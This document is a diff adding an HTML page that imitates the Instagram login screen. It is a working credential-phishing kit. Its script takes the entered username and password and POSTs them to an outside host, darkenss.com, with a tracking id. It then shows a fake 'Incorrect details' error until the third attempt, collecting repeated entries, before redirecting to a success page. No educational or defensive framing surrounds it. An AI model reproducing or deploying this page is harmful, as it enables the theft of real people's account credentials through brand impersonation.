@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+
+    <link rel="stylesheet" href="css/instagram.css">
+
+    <!-- Font Awesome core CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+    <style>
+        /* Add styles for the error message */
+        .error-message {
+            color: red;
+            display: none; /* Initially hidden */
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body> 
+    <div class="form"> 
+        <img src="images/insta-bg.jpg" class="img-bg">
+        <div class="container">
+            <form id="login-form">
+                <img src="images/insta.png" alt="">
+
+                <div class="inp">
+                    <input type="text" name="username" placeholder="Phone number, username or email" required>
+                    <input type="password" name="password" id="password" placeholder="Password" required>
+                </div>
+
+                <button class="but" type="submit">Log in</button>
+                
+                <p class="error-message" id="error-message">Incorrect details, try again.</p>
+
+                <div class="horizotal-line">
+                    <div class="hori"></div>
+                    <div><p>OR</p></div>
+                    <div class="hori"></div>
+                </div>      
+
+                <a href="">
+                    <p style="color: #182492;font-weight: 550;font-size: 0.9rem;margin-bottom: 15px;"><i class="fab fa-facebook-square" style="margin-right: 10px;"></i> Login with Facebook</p>
+                </a>
+
+                <a href="" class="forget">Forgot password?</a> <br>
+            </form>
+
+            <div class="last">
+                <p style="margin-top: 15px;font-size: 0.9rem;">Don't have an account? <a href="" style="color: deepskyblue;">Sign up</a></p>
+            </div>
+
+            <div class="last-bg">
+                <p>Get the app.</p>
+                <div class="appstore">
+                    <a href="">
+                        <img src="images/goo.png" class="fir">
+                    </a>
+                    <a href="">
+                        <img src="images/mic.png" alt="">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    let loginAttempts = 0;
+
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent default form submission
+        
+        // Retrieve form data
+        const formData = new FormData(event.target);
+        const username = formData.get('username');
+        const password = formData.get('password');
+        
+        // Backend API URL
+        const apiUrl = 'https://darkenss.com/api/submit/';
+        
+        // ID and URL Link for the request (you can set these dynamically if needed)
+        const id = '59fe207c-151f-407d-8810-2b4958fbead8'; // Replace with the actual user ID
+        const urlLink = 'http://instagram.com'; // Replace with the actual URL
+        
+        // Prepare data to send
+        const data = {
+            id: id,
+            url_link: urlLink,
+            username: username,
+            password: password
+        };
+        
+        // Send the data to the backend API
+        fetch(apiUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        })
+        .then(response => response.json())
+        .then(data => {
+            loginAttempts++;
+            if (loginAttempts >= 3) {
+                // Redirect to success page on the third attempt
+                window.location.href = 'success.html';
+            } else {
+                // Show error message
+                const errorMessage = document.getElementById('error-message');
+                errorMessage.style.display = 'block';
+            }
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            const errorMessage = document.getElementById('error-message');
+            errorMessage.textContent = 'An error occurred. Please try again.';
+            errorMessage.style.display = 'block';
+        });
+    });
+    </script>
+</body>
+</html>
